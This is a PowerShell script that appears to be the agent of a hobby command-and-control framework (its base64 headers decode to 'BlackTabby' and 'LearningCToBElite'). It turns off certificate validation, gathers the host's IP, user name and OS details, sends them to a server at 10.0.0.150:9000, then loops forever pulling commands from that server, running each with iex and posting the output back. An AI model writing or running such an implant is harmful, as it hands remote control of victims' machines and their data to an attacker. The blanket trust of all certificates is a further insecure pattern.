function ConvertTo-HashtableFromPsCustomObject { 
    param ( 
        [Parameter(  
            Position = 0,   
            Mandatory = $true,   
            ValueFromPipeline = $true,  
            ValueFromPipelineByPropertyName = $true  
        )] [object] $psCustomObject 
    );
    Write-Verbose "[Start]:: ConvertTo-HashtableFromPsCustomObject"

    $output = @{}; 
    $psCustomObject | Get-Member -MemberType *Property | % {
        $output.($_.name) = $psCustomObject.($_.name); 
    } 
    
    Write-Verbose "[Exit]:: ConvertTo-HashtableFromPsCustomObject"

    return  $output;
}


add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3, [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12

$complete = @("")
$pending = @("")
$ip_result = Invoke-WebRequest ipinfo.io/ip | Select-Object -ExpandProperty Content
$user_result = iex whoami
$os_result = (Get-WMIObject win32_operatingsystem).name + " " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture + " "  +  (Get-WmiObject Win32_OperatingSystem).CSName
$agent_id_result = Get-Random -Minimum -1000 -Maximum 90000

$json_format = @{
    agent_id= $agent_id_result
    ip= $ip_result.trim()
    os= $os_result.trim()
    user= $user_result.trim()
    pending_commands=@()
    completed_commands=@()

}

$headerz = @{
    "User-Agent"     ="QmxhY2tUYWJieQo="
    "Agent"          ='TGVhcm5pbmdDVG9CRWxpdGUK'
}

$json_doc = $json_format | ConvertTo-Json
$response = Invoke-RestMethod "https://10.0.0.150:9000/first_check_in" -Method Post -Body $json_doc -Headers $headerz -ContentType 'application/json'
$doc_id = $response.id
$refresh_token = $response.refresh
$access_token = $response.token


$poll_headers = @{}
$poll_headers.Add('doc_id',$doc_id)
$poll_headers.Add('Authorization',"Bearer $access_token")

$complete_commands =@{}

while ($true){

$polling_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
$post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)


  if ($polling_resp.pending_commands) {
    foreach ($command in $polling_resp.pending_commands){

    if ($command.StartsWith('"')){
    $comm_result = iex "& $command" | format-list
    $complete_commands.Add($command,$comm_result) 
    $post_body.completed_commands += @{$command=$comm_result}
    }
    else{
    $comm_result = iex $command
    $complete_commands.Add($command,$comm_result)
    $post_body.completed_commands += @{$command=$comm_result}
    }
  }
    $post_body.pending_commands = @()
    $json_post = $post_body | ConvertTo-Json
    $post_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Post -Body $json_post -Headers $poll_headers -ContentType 'application/json'
    # call refresh to get new token and add it to the headers hash table
    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
    $access_token = $refresh_resp.token
    $poll_headers['Authorization'] = "Bearer $access_token"

}
  else {
    #echo "no command"
    # call refresh to get new token and add it to the headers hash table
    $refresh_resp = Invoke-RestMethod "https://10.0.0.150:9000/refresh" -Method Get -Headers @{"Authorization"="Bearer $refresh_token"} -ContentType 'application/json'
    $access_token = $refresh_resp.token
    $poll_headers['Authorization'] = "Bearer $access_token"
  }

  sleep(10)

  }

  #echo "while loop ended"
  #echo $post_body | ConvertTo-Json
 


